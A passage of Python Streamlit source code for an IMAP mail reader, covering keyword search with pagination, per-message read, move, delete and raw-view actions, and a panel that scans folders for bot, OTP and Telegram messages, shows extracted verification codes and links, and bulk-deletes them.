        search_field_choice = st.selectbox("Search Field Option", ["TEXT", "SUBJECT", "BODY", "FROM"], key="deep_search_field")

    search_query_input = st.text_input("Search term or keyword", key="deep_search_query")
    search_blacklist_input = st.text_input("Blacklist Keywords (comma-separated)", key="deep_search_blacklist_kw")

    search_page_size = st.slider("Search Results Page Size", 5, 200, key="search_page_size_slider")

    if st.button("🔍 Execute Keyword Search", type="primary", width="stretch", key="deep_search_btn"):
        host = resolve_active_host(active_email)
        if not active_email or not active_password or not host:
            st.error("Please connect and load folders first.")
        elif not search_query_input.strip():
            st.warning("Please enter a keyword or search term.")
        elif not search_scope_choice:
            st.warning("Please select at least one folder for Search Scope Option.")
        else:
            try:
                target_scope = search_scope_choice
                with st.spinner(f"Scanning target mailboxes ({len(target_scope)} folder/s) for [{search_field_choice}: '{search_query_input.strip()}']..."):
                    mail = get_active_mail(active_email, active_password, host)
                    msgs = fetch_messages_paginated(
                        mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice,
                        mode="SEARCH", page_size=search_page_size, page_number=1, sort_order=sort_order,
                        log_target="SEARCH"
                    )
                    st.session_state.search_messages = msgs
                    st.session_state.search_current_page = 1
                    save_session_cache()
                    log(f"Search found {st.session_state.search_total_matched_count} total matches across target scope.")
                    flash(f"Search complete. Found {st.session_state.search_total_matched_count} match(es).")
                    st.rerun()
            except Exception as e:
                st.error(str(e))

    st.markdown("#### ✉️ Search Results Message Stream")
    search_msgs = [m for m in st.session_state.search_messages if not should_blacklist_message(m, search_blacklist_input)]
    search_total_msgs = st.session_state.get("search_total_matched_count", len(search_msgs))

    if len(search_msgs) > 0:
        search_total_pages = max(1, math.ceil(search_total_msgs / max(1, search_page_size)))
        search_curr_p = max(1, min(int(st.session_state.search_current_page or 1), search_total_pages))
        st.session_state.search_current_page = search_curr_p

        st.markdown(f"**Showing Page {search_curr_p} of {search_total_pages} (Total Matches Found: {search_total_msgs})**")

        for idx, msg in enumerate(search_msgs):
            with st.expander(msg_label(msg, idx), expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                _sb_key = f"s_body_{msg['folder']}_{msg['id']}_{idx}"
                if _sb_key not in st.session_state:
                    st.session_state[_sb_key] = msg["body"]
                _render_body(_sb_key, msg)

                s_op1, s_op2, s_op3, s_op4 = st.columns(4)
                host = resolve_active_host(active_email)
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with s_op1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"s_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                flash("Marked as read.")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with s_op2:
                    s_target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"s_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"s_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            move_message(m_client, msg["folder"], msg["id"], s_target_move)
                            drop_msg("search_messages", msg)
                            save_session_cache()
                            flash(f"Moved to {s_target_move}.")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op3:
                    s_del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(s_del_label, key=f"s_del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            drop_msg("search_messages", msg)
                            save_session_cache()
                            flash("Message deleted.")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        sp_col1, sp_col2, sp_col3 = st.columns([1, 2, 1])

        with sp_col1:
            if st.button("Previous Page", disabled=(search_curr_p <= 1), width="stretch", key="s_prev_pg"):
                st.session_state.search_current_page = search_curr_p - 1
                _reader_reload_page(st.session_state.search_current_page,
                                    search_scope_choice if search_scope_choice else [folder],
                                    "SEARCH", search_page_size, sort_order, "SEARCH",
                                    "search_messages", query=search_query_input,
                                    field=search_field_choice)

        with sp_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {search_curr_p} of {search_total_pages}</h4>", unsafe_allow_html=True)

        with sp_col3:
            if st.button("Next Page", disabled=(search_curr_p >= search_total_pages), width="stretch", key="s_next_pg"):
                st.session_state.search_current_page = search_curr_p + 1
                _reader_reload_page(st.session_state.search_current_page,
                                    search_scope_choice if search_scope_choice else [folder],
                                    "SEARCH", search_page_size, sort_order, "SEARCH",
                                    "search_messages", query=search_query_input,
                                    field=search_field_choice)
    else:
        st.caption("No search results loaded yet. Enter a query and click 'Execute Keyword Search'.")

    st.markdown("#### 🛠️ Deep Search Debugging & Diagnostic Log Screen")
    with st.expander("🔍 Search Engine IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.search_diag_logs:
            st.code(diag_text("search_diag_logs"), language="text")
        else:
            st.caption("Search engine logs will be recorded here after executing a keyword search.")
# @@END 040 DEEP_SEARCH


# @@BLOCK 041 BOT_PURGE deps=040
# Mass Bot Purge & Intelligence Hub
st.markdown("---")
# checkbox, not expander.
hub_bot_open = st.checkbox("🤖 Mass Bot Purge & Intelligence Hub", key="hub_bot_open")
if hub_bot_open:
    all_loaded_bot_msgs = [m for m in st.session_state.current_messages if m.get("is_bot")]

    if "bot_hub_folder_select" not in st.session_state:
        st.session_state["bot_hub_folder_select"] = ["INBOX"]
    if "bot_page_size_slider" not in st.session_state:
        st.session_state["bot_page_size_slider"] = 15
    # bot_scan_depth is a SELECTBOX: the value must be one of the four options,
    # not merely inside a numeric range, or st.selectbox raises on restore.
    if st.session_state.get("bot_scan_depth") not in (50, 100, 200, 500):
        st.session_state["bot_scan_depth"] = 100
    if not isinstance(st.session_state.get("bot_page_size_slider"), int):
        st.session_state["bot_page_size_slider"] = 15

    bot_scope_options = _ui_folder_options()
    _bt_keep = [f for f in (st.session_state.get("bot_hub_folder_select") or []) if f in bot_scope_options]
    st.session_state["bot_hub_folder_select"] = _bt_keep or ["INBOX"]

    bot_col1, bot_col2 = st.columns([2, 1])

    with bot_col1:
        bot_target_folder = st.multiselect("Select Bot Target Scope", bot_scope_options, key="bot_hub_folder_select")
    with bot_col2:
        bot_scan_limit = st.selectbox("Bot Scan Depth", [50, 100, 200, 500], key="bot_scan_depth")

    bot_page_size = st.slider("Bot Stream Results Page Size", 5, 200, key="bot_page_size_slider")

    st.caption("⚠️ The purge below deletes only the bot messages currently shown in the loaded stream. "
               "It uses their stored IDs. It does not run a new server search.")

    b_act1, b_act2 = st.columns(2)

    with b_act1:
        if st.button("🔍 Scan Folder For Bot/OTP/Telegram Messages", width="stretch"):
            host = resolve_active_host(active_email)
            if not active_email or not active_password or not host:
                st.error("Please connect first.")
            elif not bot_target_folder:
                st.warning("Please select at least one folder for Bot Target Scope.")
            else:
                try:
                    target_scope = bot_target_folder
                    with st.spinner("Scanning target folders for bot & Telegram intelligence..."):
                        mail = get_active_mail(active_email, active_password, host)
                        msgs = fetch_messages_paginated(
                            mail, active_email, active_password, host, target_scope, mode="FOLDER_ONLY",
                            page_size=bot_scan_limit, page_number=1, sort_order="Newest First",
                            log_target="DEBUG"
                        )
                        st.session_state.current_messages = msgs
                        st.session_state.bot_current_page = 1
                        # the scan no longer FORCES the stream into bot filter mode;
                        # the stream stays complete unless you tick it.
                        st.session_state["_pending_page_size"] = bot_scan_limit
                        save_session_cache()
                        flash("Scan complete. The stream holds every row; tick the filter box to narrow it to bots.")
                        st.rerun()
                except Exception as ex:
                    st.error(str(ex))

    with b_act2:
        if st.button("🚨 Mass Delete All Detected Bot Messages", type="primary", width="stretch"):
            if not all_loaded_bot_msgs:
                st.warning("No bot messages detected in current loaded stream to delete.")
            else:
                st.session_state.bot_diag_logs = []
                host = resolve_active_host(active_email)
                try:
                    bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
                    mail = get_active_mail(active_email, active_password, host)
                    deleted_count = 0

                    by_folder = {}
                    for bm in all_loaded_bot_msgs:
                        by_folder.setdefault(bm.get("folder") or folder, []).append(bm.get("id"))

                    folders = sorted(by_folder.keys()) or [folder]
                    skipped_folders = []
                    for r_folder in folders:
                        r_encoded = encode_imap_utf7(get_imap_path(r_folder))
                        sel_typ, sel_data = mail.select(f'"{r_encoded}"', readonly=False)
                        if sel_typ != "OK":
                            bot_log(f"⚠️ Skipped '{r_folder}': select failed ({sel_typ} {sel_data})")
                            skipped_folders.append(r_folder)
                            continue
                        bot_log(f"📂 Selected '{r_folder}' for purge.")

                        ids = [i for i in by_folder.get(r_folder, []) if i]
                        if not ids:
                            bot_log(f"  └─ no bot IDs in '{r_folder}'.")
                            continue

                        id_csv = b",".join(sorted(ids, key=lambda x: int(x)))
                        st_typ, st_data = mail.store(id_csv, "+FLAGS", "\\Deleted")
                        if st_typ != "OK":
                            bot_log(f"  └─ ⚠️ STORE refused in '{r_folder}': {st_typ} {st_data}")
                            skipped_folders.append(r_folder)
                            continue
                        deleted_count += len(ids)
                        bot_log(f"  └─ marked {len(ids)} bot message(s) deleted in '{r_folder}'.")
                        mail.expunge()

                    if skipped_folders:
                        bot_log(f"🏁 Skipped folders: {skipped_folders}")

                    bot_log(f"🏁 [MASS DELETE COMPLETE] Purged {deleted_count} messages across {len(folders) - len(skipped_folders)} folder(s).")

                    st.session_state.current_messages = [m for m in st.session_state.current_messages if not m.get("is_bot")]
                    # the pager counts server matches, so the deleted rows have to
                    # come off the total or the last pages are phantom.
                    _tm = st.session_state.get("total_matched_count")
                    if isinstance(_tm, int):
                        st.session_state.total_matched_count = max(0, _tm - deleted_count)
                    save_session_cache()
                    flash(f"Purged {deleted_count} message(s)." + (f" Skipped: {', '.join(skipped_folders)}" if skipped_folders else ""))
                    st.rerun()
                except Exception as e:
                    bot_log(f"❌ [MASS DELETE EXCEPTION]: {e}")
                    st.error(f"Error during mass delete: {e}")

    st.markdown("#### 📱 Detected Bot Message Preview Screen")
    if all_loaded_bot_msgs:
        bot_total_pages = max(1, math.ceil(len(all_loaded_bot_msgs) / bot_page_size))
        bot_curr_p = max(1, min(int(st.session_state.bot_current_page or 1), bot_total_pages))
        st.session_state.bot_current_page = bot_curr_p

        start_idx = (bot_curr_p - 1) * bot_page_size
        end_idx = start_idx + bot_page_size
        paged_bot_msgs = all_loaded_bot_msgs[start_idx:end_idx]

        st.markdown(f"**Showing Bot Page {bot_curr_p} of {bot_total_pages} ({len(all_loaded_bot_msgs)} Total Detected Bots)**")

        for idx, bm in enumerate(paged_bot_msgs, start_idx + 1):
            _subj = re.sub(r"\s+", " ", str(bm.get("subject", "")))[:120]
            st.markdown(
                f"**[{idx}] [{html.escape(str(bm['folder']))}]** `{html.escape(str(bm['from']))}` — "
                f"**{html.escape(_subj)}** (ID: `{bm['id']}`)"
            )
            if bm["pins"]:
                st.info(f"🔑 PINs detected: {', '.join(bm['pins'])}")

        st.markdown("---")
        bp_c1, bp_c2, bp_c3 = st.columns([1, 2, 1])
        with bp_c1:
            if st.button("Previous Bot Page", disabled=(bot_curr_p <= 1), width="stretch", key="bot_prev_pg"):
                st.session_state.bot_current_page = bot_curr_p - 1
                save_session_cache()
                st.rerun()
        with bp_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {bot_curr_p} of {bot_total_pages}</h4>", unsafe_allow_html=True)
        with bp_c3:
            if st.button("Next Bot Page", disabled=(bot_curr_p >= bot_total_pages), width="stretch", key="bot_next_pg"):
                st.session_state.bot_current_page = bot_curr_p + 1
                save_session_cache()
                st.rerun()
    else:
        st.caption("No bot messages currently loaded in session memory.")

    st.markdown("#### 🛠️ Mass Bot Delete Diagnostic & Diagnose Log Screen")
    if st.session_state.bot_diag_logs:
        st.code(diag_text("bot_diag_logs"), language="text")
    else:
        st.caption("Bot engine traces will be printed here during purge operations.")
# @@END 041 BOT_PURGE


# @@BLOCK 042 BACK_TO_CHECKER deps=041
# --- Back to Checker ---
st.markdown("---")
try:
    st.page_link("app.py", label="← Back to the Mail Checker")
except Exception:
    st.caption("The main checker lives at app.py")

# v13.45: fit() already ran in block 001. Calling it again here assigned the
# widget keys after the widgets existed, which raised inside fit()'s own
# try/except - so it silently did nothing except emit the CSS a second time.
# fit() must be called exactly once per page, and the panel is its own late call.
# @@END 042 BACK_TO_CHECKER


# @@BLOCK 043 TRAILING deps=042
# The last thing a run does is persist the panel and this mail's edits. Deduped
# and throttled inside _reader_ui_save, so a run that changed nothing costs one
# string compare and no write.
_reader_ui_save()
# @@END 043 TRAILING
# @@EOF
